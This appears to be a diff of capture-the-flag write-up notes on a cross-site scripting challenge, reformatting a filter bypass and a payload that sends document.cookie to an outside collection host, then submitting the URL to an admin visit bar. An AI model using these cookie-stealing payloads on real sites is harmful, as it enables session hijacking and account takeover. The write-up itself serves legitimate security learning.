@@ -87,9 +87,18 @@ aaa"/><script>var cookieData = document.cookie; var i = new Image();i.src = "htt
 
 c. CTF XSS 4
   - Error = In the board, it is possible to use special characters (<'">).
-  - Check the attack possibility of using an attack statement on the board. => <script>alert(1)</script>
-  - Filtering "script" and "alert", so using another attack statement => <img src=x onerror=confirm(1)> 
-  - Check the attack => <img src="https://x" onerror="location.href='http://enjt04rx79at.x.pipedream.net/?cookie=' + document.cookie;">
+  - Check the attack possibility of using an attack statement on the board.
+```javascript
+<script>alert(1)</script>
+```
+  - Filtering "script" and "alert", so using another attack statement
+```javascript
+<img src=x onerror=confirm(1)>
+```
+  - Check the attack
+```javascript
+<img src="https://x" onerror="location.href='http://enjt04rx79at.x.pipedream.net/?cookie=' + document.cookie;">
+```
   - Block the long subject
   - Check the attack on the content box
   - Copy URL and input the URL on the admin visit bar
